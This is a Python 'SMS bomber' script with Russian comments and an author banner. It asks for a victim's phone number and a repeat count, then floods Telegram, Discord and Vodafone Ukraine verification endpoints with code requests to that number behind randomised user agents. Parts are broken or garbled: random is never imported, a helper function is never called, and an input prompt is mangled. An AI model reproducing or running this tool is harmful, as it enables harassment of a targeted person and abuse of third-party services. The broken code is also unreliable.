#Библиотеки
import requests
import fake_useragent
import time
import os
import threading
from threading import Thread
from rich.console import Console
from rich.progress import *
#Обозначение
console = Console()

os.system('cls' if os.name == 'nt' else 'clear')


def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
console.print('''[bold red]
 -----------------------------------------
| Создатель - Hironotori                  |
| Telegram - @Hironotori                  |
| Человек которий сильно помог - @GGClubbb|
 -----------------------------------------
''')
number = input('[green]Beeante HOMeP tenedona: (бes + ')



run = int(console.input('[green]Введите количество повторов (1-10):\n[blue]spammer>> '))
for _ in track(range(run)):
 try:
     print('telegram')
     requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers)
 except:
     print('Не отправлено (telegram)')
 try:
     print('discord')
     requests.post("https://discord.com/api/v9/auth/register/phone", json={"phone": "+" + number}, headers=headers)
 except:
     print('Не отправлено (discord)')
 try:
     print('vodafone')
     requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
 except:
     print('Не отправлено (vodafone)')
